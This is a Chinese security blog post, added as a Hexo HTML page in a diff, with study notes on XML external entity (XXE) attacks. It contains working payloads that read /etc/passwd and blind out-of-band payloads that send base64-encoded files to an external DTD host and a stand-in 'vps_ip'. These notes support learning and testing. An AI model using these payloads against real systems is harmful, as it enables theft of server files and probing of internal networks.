@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>XXE漏洞基本原理利用与防御 | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何构造外部实体注入攻击"><span class="toc-text">如何构造外部实体注入攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寻找XXE"><span class="toc-text">寻找XXE</span></a></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">XXE漏洞基本原理利用与防御</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 21, 2018&nbsp;&nbsp;13:17:37</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p>OWASP TOP10 XXE</p>
+<a id="more"></a>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://bbs.ichunqiu.com/thread-44306-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-44306-1-1.html</a><br><a href="http://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">http://www.freebuf.com/column/156863.html</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a><br><a href="https://xz.aliyun.com/t/2571#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/2571#toc-10</a><br><a href="http://www.w3school.com.cn/dtd/" target="_blank" rel="noopener">http://www.w3school.com.cn/dtd/</a><br>jarvis oj API调用就是XXE漏洞的利用</p>
+<p>这些网站对XXE 的解释以及利用防御都已经十分详细(由于机器环境限制,并没有完整复现,简单做下笔记,留坑以后补)</p>
+<p>　　libxml2.9.1及以后，默认不解析外部实体。可以在此了解libxml各版本具体改动情况。本次测试在Window下使用的php5.4.45(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。当XML声明中standalone值是yes的时候表示DTD仅用于验证文档结构，外部实体将被禁用。但它的默认值是no，而且有些parser会直接忽略这一项。</p>
+<h2 id="如何构造外部实体注入攻击"><a href="#如何构造外部实体注入攻击" class="headerlink" title="如何构造外部实体注入攻击"></a>如何构造外部实体注入攻击</h2><p>　　一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。<br>　　有回显的payload写法：</p>
+<ol>
+<li>直接通过DTD外部实体声明。XML内容如下：<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+        &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;abc&gt;&amp;test;&lt;/abc&gt;</code></pre></li>
+<li>通过DTD文档引入外部DTD文档，再引入外部实体声明。XML内容如下：<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;
+&lt;abc&gt;&amp;b;&lt;/abc&gt;</code></pre>evil.dtd内容：<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></pre></li>
+<li>通过DTD外部实体声明引入外部实体声明。XML内容如下:<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+        &lt;!ENTITY % d SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;
+%d;
+]&gt;
+&lt;abc&gt;&amp;b;&lt;/abc&gt;</code></pre>evil.dtd内容：<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></pre>但是如果想通过如下声明是不可以的：<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
+&lt;!DOCTYPE a [
+&lt;!ENTITY d SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
+]&gt;
+&lt;abc&gt;&amp;d;&lt;/abc&gt;</code></pre>测试发现这种实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，参数实体就好用很多。<br>　　无回显的payload写法：</li>
+<li>第一种无回显示payload写法：<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
+&lt;!DOCTYPE a [
+&lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt; 
+%dtd; %all; 
+]&gt; 
+&lt;abc&gt;&amp;send;&lt;/abc&gt;</code></pre>其中evil.xml文件内容为<pre><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://localhost%file;&apos;&gt;&quot;&gt;</code></pre>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。</li>
+<li>第二种无回显payload写法：<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
+%dtd;
+%send;
+]&gt;
+&lt;abc&gt;&lt;/abc&gt;</code></pre>其中evil.xml文件内容为：<pre><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &apos;http://localhost/?content=%file;&apos;&gt;&quot;&gt; %payload;</code></pre>调用过程和第一种方法类似，但最里层的嵌套里%要进行实体编码成%。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。<br>　　这里注意参数实体引用%file;必须放在外部文件里，因为根据这条 规则 。在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： PEReferences forbidden in internal subset。这里的        internal subset指的是中括号[]内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。<br>　　一般都使用第二种方法，因为当文件中含有中文字符或&lt;字符，会导致不能解析。</li>
+</ol>
+<h2 id="寻找XXE"><a href="#寻找XXE" class="headerlink" title="寻找XXE"></a>寻找XXE</h2><p>检测xml是否被解析<br>　　尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。<br>单双引号 ‘ “ ：XML的属性值必须用引号包裹，而数据可能进入标签的属性值。<br>尖括号&lt; &gt; ：XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。<br>注释符<!-- ：XML使用<!-- This is a comment -->作注释。<br>&amp; ：&amp; 用于引用实体。<br>CDATA 分隔符]]&gt; ：<!--[CDATA[foo]]-->中的内容不被解析器解析，提前闭合引发异常。<br>检测是否支持外部实体解析<br>　　尝试利用实体和DTD。<br>引用外部DTD文件访问内网主机/端口 ：<!DOCTYPE a SYSTEM "http://127.0.0.1:2333">（看响应时间）<br>引用外部DTD文件访问外网 ：<!DOCTYPE a SYSTEM "http://vps_ip" ><br>引用内部实体 ：<!DOCTYPE a [<!ENTITY xxe "findneo">]&gt;<a>&xxe;</a><br>外部实体读本地文件 ：<!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/hosts">]&gt;<a>&xxe;</a><br>外部实体访问内网主机/端口 ：<!DOCTYPE a SYSTEM "http://192.168.1.2:80">（看响应时间）<br>外部实体访问外网 ：<!DOCTYPE a [<!ENTITY xxe SYSTEM "http://vps_ip">]&gt;<a>&xxe;</a><br>判断问题存在可以OOB提取数据。</p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/08/21/XXE/">http://yoursite.com/2018/08/21/XXE/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/08/24/SQL-study/">SQL-study</a>
+            
+            
+            <a class="next" rel="next" href="/2018/08/20/p/">DVWA-SQL</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
